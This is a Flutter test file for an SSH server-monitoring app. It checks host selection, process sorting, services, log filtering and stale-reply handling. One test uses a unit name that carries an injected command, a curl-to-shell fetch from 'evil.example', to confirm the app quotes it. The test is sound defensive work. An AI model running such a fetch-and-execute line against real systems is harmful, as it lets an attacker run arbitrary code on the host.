import 'dart:async';

import 'package:drift/drift.dart' show Value;
import 'package:drift/native.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:omniterm/data/app_database.dart';
import 'package:omniterm/data/app_repository.dart';
import 'package:omniterm/data/remote_models.dart';
import 'package:omniterm/data/ssh/ssh_transport.dart';
import 'package:omniterm/platform/secret_store.dart';
import 'package:omniterm/ui/view_model/app_state.dart';
import 'package:omniterm/ui/view_model/monitor_view_model.dart';

import 'support/fake_secure_storage.dart';

/// Records every command it is asked to run and replies from a scripted map.
class RecordingTransport implements SshTransport {
  RecordingTransport({this.replies = const {}, this.fallback = ''});

  Map<Pattern, String> replies;
  final String fallback;

  /// When set, every `exec` throws it — simulating a dropped connection.
  Object? failure;

  final List<String> commands = [];
  final List<String?> stdins = [];

  /// Completes each `exec` only when released, so a slow reply can be simulated.
  Completer<void>? gate;

  @override
  Future<String> exec(SshCredentials creds, String command, {String? stdin}) async {
    commands.add(command);
    stdins.add(stdin);
    if (gate != null) await gate!.future;
    if (failure != null) throw failure!;
    for (final entry in replies.entries) {
      if (command.contains(entry.key)) return entry.value;
    }
    return fallback;
  }

  @override
  noSuchMethod(Invocation invocation) => throw UnimplementedError();
}

void main() {
  late AppDatabase db;
  late AppRepository repo;
  late AppState app;

  setUp(() {
    db = AppDatabase(NativeDatabase.memory());
    repo = AppRepository(db, SecretStore(storage: FakeSecureStorage(<String, String>{})));
    app = AppState(repo);
  });

  tearDown(() async {
    app.dispose();
    await db.close();
  });

  Server server({
    required String name,
    String status = 'online',
    String sudoPassword = '',
  }) =>
      Server(
        id: 0,
        name: name,
        host: '10.0.0.1',
        port: 22,
        username: 'root',
        serverColor: 'Default',
        authType: 'password',
        authPassword: 'pw',
        sudoPassword: sudoPassword,
        notes: '',
        keepAlive: 30,
        sshCompression: false,
        persistentSession: false,
        proxyCommand: '',
        proxyType: 'none',
        proxyHost: '',
        proxyPort: 0,
        proxyUser: '',
        proxyPassword: '',
        agentForwarding: false,
        healthScore: 100,
        lastLatency: 0,
        status: status,
        authStatus: 'ok',
      );

  Future<MonitorViewModel> boot({RecordingTransport? transport}) async {
    await app.start();
    await Future<void>.delayed(Duration.zero);
    return MonitorViewModel(app, transport: transport);
  }

  group('which host is monitored', () {
    test('nothing online means the empty state', () async {
      await repo.insertServer(server(name: 'a', status: 'offline'));
      final vm = await boot();
      expect(vm.hasNoOnlineHosts, isTrue);
      expect(vm.monitoredServer, isNull);
      vm.dispose();
    });

    test('with no explicit selection it falls back to the first online host', () async {
      await repo.insertServer(server(name: 'down', status: 'offline'));
      final upId = await repo.insertServer(server(name: 'up'));
      final vm = await boot();
      await Future<void>.delayed(Duration.zero);
      expect(vm.monitoredServer?.id, upId);
      vm.dispose();
    });

    test('the explicit selection wins when it is online', () async {
      await repo.insertServer(server(name: 'a'));
      final bId = await repo.insertServer(server(name: 'b'));
      final vm = await boot();
      app.selectedServerId = bId;
      await Future<void>.delayed(Duration.zero);
      expect(vm.monitoredServer?.name, 'b');
      vm.dispose();
    });

    test('a selected host that goes offline is not monitored — §15.4', () async {
      // The Kotlin honoured the selection unconditionally, so Monitor kept rendering an offline
      // host that the online-only selector bar above it no longer listed, with no way to switch
      // away and every tab still issuing commands at a host that was down.
      final aId = await repo.insertServer(server(name: 'a'));
      final bId = await repo.insertServer(server(name: 'b'));
      final vm = await boot();
      app.selectedServerId = aId;
      await Future<void>.delayed(Duration.zero);
      expect(vm.monitoredServer?.id, aId);

      await repo.updateServer((await repo.getServerById(aId))!.copyWith(status: 'offline'));
      await Future<void>.delayed(Duration.zero);

      expect(vm.monitoredServer?.id, bId, reason: 'it falls back to a host that can answer');
      vm.dispose();
    });

    test('the last online host going down returns to the empty state', () async {
      final id = await repo.insertServer(server(name: 'only'));
      final vm = await boot();
      await Future<void>.delayed(Duration.zero);
      expect(vm.hasNoOnlineHosts, isFalse);

      await repo.updateServer((await repo.getServerById(id))!.copyWith(status: 'offline'));
      await Future<void>.delayed(Duration.zero);
      expect(vm.hasNoOnlineHosts, isTrue);
      vm.dispose();
    });
  });

  group('tabs', () {
    test('refresh fetches what the active tab shows, not host metrics', () async {
      // Refreshing Monitor on the Services tab has to fetch services.
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport();
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      vm.activeTab = MonitorTab.services;
      await Future<void>.delayed(Duration.zero);
      expect(transport.commands.last, contains('systemctl list-units'));

      vm.activeTab = MonitorTab.logs;
      await Future<void>.delayed(Duration.zero);
      expect(transport.commands.last, contains('journalctl'));

      vm.activeTab = MonitorTab.processes;
      await Future<void>.delayed(Duration.zero);
      expect(transport.commands.last, contains('ps -eo'));
      vm.dispose();
    });

    test('overview fetches host metrics and caches the OS for the other tabs', () async {
      final id = await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport(replies: {
        "echo '@OS'": '@OS\nFreeBSD\n@CPU\nCPU: 10.0% idle\n',
      });
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);
      await vm.loadActiveTab();

      expect(transport.commands.single, contains('@LOAD'));
      // Probing uname once and caching it beats every tab asking for itself.
      expect(app.osForServer(id), 'FreeBSD');
      await vm.loadProcesses();
      expect(transport.commands.last, contains('ps -axo'),
          reason: 'the cached OS must pick the BSD ps variant');
      vm.dispose();
    });
  });

  group('processes', () {
    const psOutput = '''
  PID USER     %CPU %MEM    VSZ     ELAPSED STAT COMMAND
  101 root      5.0 40.0 100000    01:00:00 S    lowcpu-highmem
  102 root     90.0  1.0 100000    01:00:00 S    highcpu-lowmem
''';

    test('loads and sorts by CPU by default', () async {
      await repo.insertServer(server(name: 'a'));
      final vm = await boot(transport: RecordingTransport(replies: {'ps -eo': psOutput}));
      await Future<void>.delayed(Duration.zero);
      await vm.loadProcesses();

      expect(vm.processes.first.name, 'highcpu-lowmem');
      vm.dispose();
    });

    test('switching to memory re-sorts without another round trip', () async {
      // The Kotlin re-fetched from the host on a sort toggle, so the user waited on the network to
      // reorder a list already in hand.
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport(replies: {'ps -eo': psOutput});
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);
      await vm.loadProcesses();
      final callsAfterLoad = transport.commands.length;

      vm.sortByCpu = false;
      expect(vm.processes.first.name, 'lowcpu-highmem');
      expect(transport.commands.length, callsAfterLoad);
      vm.dispose();
    });

    test('expanding a row toggles, and only one row is open', () async {
      final vm = await boot();
      vm.toggleProcessExpanded(101);
      expect(vm.expandedProcessPid, 101);
      vm.toggleProcessExpanded(102);
      expect(vm.expandedProcessPid, 102);
      vm.toggleProcessExpanded(102);
      expect(vm.expandedProcessPid, isNull);
      vm.dispose();
    });
  });

  group('services', () {
    test('a host with no service manager says so', () async {
      await repo.insertServer(server(name: 'a'));
      final vm = await boot(
        transport: RecordingTransport(replies: {'systemctl list-units': '---NOSYSTEMD---'}),
      );
      await Future<void>.delayed(Duration.zero);
      await vm.loadServices();

      expect(vm.servicesUnsupported, isTrue,
          reason: 'otherwise the tab looks like a host running nothing');
      vm.dispose();
    });

    test('an action sends the sudo password via stdin, never in the command', () async {
      await repo.insertServer(server(name: 'a', sudoPassword: 'hunter2'));
      final transport = RecordingTransport();
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      await vm.runServiceAction(
        SimService(name: 'nginx', desc: '', status: 'running', subState: 'active'),
        'restart',
      );

      final actionIndex = transport.commands.indexWhere((c) => c.contains('systemctl restart'));
      expect(actionIndex, isNot(-1));
      expect(transport.commands[actionIndex], isNot(contains('hunter2')));
      expect(transport.stdins[actionIndex], 'hunter2\n');
      vm.dispose();
    });

    test('a unit name cannot inject a command', () async {
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport();
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      await vm.runServiceAction(
        SimService(name: r'x; curl evil.example|sh', desc: '', status: 'dead', subState: 'dead'),
        'restart',
      );

      final cmd = transport.commands.firstWhere((c) => c.contains('systemctl restart'));
      expect(cmd, contains(r"'x; curl evil.example|sh'"),
          reason: 'quoted, so the shell treats the whole thing as one unit name');
      vm.dispose();
    });
  });

  group('logs', () {
    const journal = '''
2026-08-04T10:00:00+0000 host sshd: accepted connection
2026-08-04T10:00:01+0000 host kernel: disk errors detected
2026-08-04T10:00:02+0000 host cron: job timeout waiting
''';

    test('a host with no log source is distinguished from one with no lines', () async {
      await repo.insertServer(server(name: 'a'));
      final vm = await boot(
        transport: RecordingTransport(replies: {'journalctl': '---NOLOGS---'}),
      );
      await Future<void>.delayed(Duration.zero);
      await vm.loadLogs();

      expect(vm.logsUnsupported, isTrue);
      expect(vm.logs, isEmpty);
      vm.dispose();
    });

    test('the level filter narrows what was already fetched, without refetching', () async {
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport(replies: {'journalctl': journal});
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);
      await vm.loadLogs();
      final calls = transport.commands.length;

      expect(vm.filteredLogs, hasLength(3));

      vm.logFilter = 'ERROR';
      expect(transport.commands.length, calls, reason: 'filtering is local');
      expect(vm.filteredLogs.every((l) => l.level == 'ERROR'), isTrue);
      expect(vm.filteredLogs, isNotEmpty,
          reason: '"disk errors detected" is an ERROR — see the §15.1 inferLevel fix');

      vm.logFilter = 'ALL';
      expect(vm.filteredLogs, hasLength(3));
      vm.dispose();
    });

    test('turning live off cancels the timer', () async {
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport(replies: {'journalctl': journal});
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      vm.logsLive = true;
      expect(vm.logsLive, isTrue);
      vm.logsLive = false;
      expect(vm.logsLive, isFalse);
      // Disposing with a live timer still running would fire loads against a disposed notifier.
      vm.dispose();
    });
  });

  group('stale replies', () {
    test('a reply for a host the user left does not overwrite the new host', () async {
      final aId = await repo.insertServer(server(name: 'a'));
      final bId = await repo.insertServer(server(name: 'b'));
      final transport = RecordingTransport(replies: {
        'ps -eo': '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
            '  1 root 9.0 1.0 100 01:00:00 S stale-proc\n',
      });
      final vm = await boot(transport: transport);
      app.selectedServerId = aId;
      await Future<void>.delayed(Duration.zero);

      transport.gate = Completer<void>();
      final pending = vm.loadProcesses();

      // The user switches host while the first fetch is still in flight.
      app.selectedServerId = bId;
      await Future<void>.delayed(Duration.zero);

      transport.gate!.complete();
      await pending;

      expect(vm.processes.any((p) => p.name == 'stale-proc'), isFalse,
          reason: "one machine's processes must never be shown under another's name");
      vm.dispose();
    });

    test('a load completing after the screen is closed does not throw', () async {
      // Leaving Monitor while a fetch is in flight is ordinary use; notifying a disposed
      // ChangeNotifier throws, which would crash the app on the way out.
      await repo.insertServer(server(name: 'a'));
      final transport = RecordingTransport();
      final vm = await boot(transport: transport);
      await Future<void>.delayed(Duration.zero);

      transport.gate = Completer<void>();
      final pending = vm.loadProcesses();
      vm.dispose();
      transport.gate!.complete();

      await expectLater(pending, completes);
    });

    test('switching host clears the previous host data immediately', () async {
      final aId = await repo.insertServer(server(name: 'a'));
      final bId = await repo.insertServer(server(name: 'b'));
      final vm = await boot(
        transport: RecordingTransport(replies: {
          'ps -eo': '  PID USER %CPU %MEM VSZ ELAPSED STAT COMMAND\n'
              '  1 root 9.0 1.0 100 01:00:00 S proc-a\n',
        }),
      );
      app.selectedServerId = aId;
      await Future<void>.delayed(Duration.zero);
      await vm.loadProcesses();
      expect(vm.processes, isNotEmpty);

      app.selectedServerId = bId;
      await Future<void>.delayed(Duration.zero);
      expect(vm.processes, isEmpty);
      vm.dispose();
    });
  });

  group('no transport', () {
    test('monitoring reports unavailable rather than showing an empty host', () async {
      await repo.insertServer(server(name: 'a'));
      final vm = await boot();
      await Future<void>.delayed(Duration.zero);

      expect(vm.canMonitor, isFalse);
      await vm.loadServices();
      expect(vm.error, isNotNull);
      expect(vm.services, isEmpty);
      vm.dispose();
    });
  });

  test('a credential failure surfaces as an error, not as a blank tab', () async {
    await repo.insertServer(
      server(name: 'a').copyWith(authType: 'key', authKeyAlias: const Value('gone')),
    );
    final vm = await boot(transport: RecordingTransport());
    await Future<void>.delayed(Duration.zero);
    await vm.loadProcesses();

    expect(vm.error, contains('gone'));
    vm.dispose();
  });
}
